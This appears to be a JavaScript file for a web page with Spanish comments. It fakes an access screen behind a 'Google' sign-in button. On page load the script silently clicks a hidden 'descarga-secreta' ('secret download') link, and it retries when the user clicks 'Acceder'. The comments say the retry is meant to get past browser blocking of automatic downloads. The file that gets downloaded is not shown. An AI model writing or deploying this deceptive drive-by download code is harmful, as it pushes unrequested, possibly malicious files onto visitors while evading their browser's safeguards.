const boton = document.getElementById('btnAcceder');
const acceso = document.getElementById('pantalla-acceso');
const contenido = document.getElementById('contenido-principal');
const modalLogin = document.getElementById('modalLogin');
const body = document.body;

// --- FUNCIÓN DE DESCARGA ---
function iniciarDescarga() {
    const linkDescarga = document.getElementById('descarga-secreta');
    if (linkDescarga) {
        // Esto simula el clic en el enlace oculto para iniciar la descarga.
        linkDescarga.click();
        console.log('Intento de descarga iniciado.');
    }
}
// ----------------------------

// 1. DESCARGA AUTOMÁTICA (Al cargar la página)
document.addEventListener('DOMContentLoaded', () => {
    // Solo intentamos la descarga si estamos en la pantalla de acceso
    if (acceso.style.display !== 'none') {
        iniciarDescarga();
    }
});


// 2. DESCARGA AL CLIC EN "ACCEDER" (Si la automática fue bloqueada)
boton.addEventListener('click', () => {
  // Intentamos la descarga de nuevo. Este clic es una interacción del usuario,
  // por lo que tiene menos probabilidades de ser bloqueado.
  iniciarDescarga();
  
  modalLogin.classList.add('show');
  body.classList.add('modal-active');
});

// Botón Google: cierra modal y muestra contenido principal
document.getElementById('btnGoogle').addEventListener('click', () => {
  modalLogin.classList.remove('show');
  body.classList.remove('modal-active');
  acceso.style.display = 'none';
  contenido.style.display = 'block';
  setTimeout(() => contenido.classList.add('show'), 50);
  window.scrollTo(0,0);
});

// Cerrar modal si se hace click fuera del contenido
modalLogin.addEventListener('click', e => {
  if(e.target === modalLogin) {
    modalLogin.classList.remove('show');
    body.classList.remove('modal-active');
  }
});
